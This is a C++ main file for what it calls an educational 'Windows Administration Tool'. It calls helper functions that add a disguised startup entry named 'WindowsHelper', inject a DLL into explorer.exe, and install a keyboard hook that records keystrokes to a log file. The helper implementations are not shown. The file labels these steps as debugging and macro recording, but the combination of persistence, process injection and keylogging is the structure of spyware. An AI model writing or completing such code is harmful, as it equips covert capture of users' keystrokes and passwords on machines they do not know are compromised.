#include "injection.h"
#include "persistence.h"
#include "keyboard.h"
#include "utils.h"
#include <iostream>

int main() {
    std::cout << "Windows Administration Tool - Educational Use Only" << std::endl;
    std::cout << "==================================================" << std::endl;
    
    // Example 1: Add persistence for system utility
    std::cout << "\n1. Adding system utility to startup..." << std::endl;
    if (AddToStartup("WindowsHelper", "C:\\temp\\myapp.exe")) {
        std::cout << "   Startup entry added successfully" << std::endl;
    } else {
        std::cerr << "   Failed to add startup entry" << std::endl;
    }
    
    // Example 2: Find and inject into explorer.exe for debugging
    std::cout << "\n2. Looking for explorer.exe process..." << std::endl;
    DWORD pid = FindProcessByName("explorer.exe");
    if (pid) {
        std::cout << "   Found explorer.exe with PID: " << pid << std::endl;
        std::cout << "   Injecting debugging DLL..." << std::endl;
        
        if (InjectDllIntoProcess(pid, "C:\\temp\\mydll.dll")) {
            std::cout << "   DLL injection successful" << std::endl;
        } else {
            std::cerr << "   DLL injection failed" << std::endl;
        }
    } else {
        std::cerr << "   explorer.exe not found" << std::endl;
    }
    
    // Example 3: Start keyboard macro recording (optional)
    std::cout << "\n3. Starting keyboard macro recording..." << std::endl;
    std::cout << "   Press Ctrl+Q to stop recording" << std::endl;
    
    if (StartKeyboardHook("C:\\temp\\logs.txt")) {
        std::cout << "   Keyboard hook active. Recording to C:\\temp\\logs.txt" << std::endl;
        std::cout << "   Press Ctrl+Q to exit..." << std::endl;
        
        // Simple message loop for keyboard hook
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) > 0) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
            
            // Check for exit condition (Ctrl+Q)
            if (GetAsyncKeyState('Q') & 0x8000 && GetAsyncKeyState(VK_CONTROL) & 0x8000) {
                std::cout << "\nCtrl+Q pressed - stopping..." << std::endl;
                break;
            }
        }
        
        StopKeyboardHook();
    } else {
        std::cerr << "   Failed to start keyboard hook" << std::endl;
    }
    
    // Example 4: Cleanup (remove persistence)
    std::cout << "\n4. Cleaning up..." << std::endl;
    if (RemoveFromStartup("WindowsHelper")) {
        std::cout << "   Startup entry removed" << std::endl;
    }
    
    std::cout << "\nTool execution completed" << std::endl;
    return 0;
}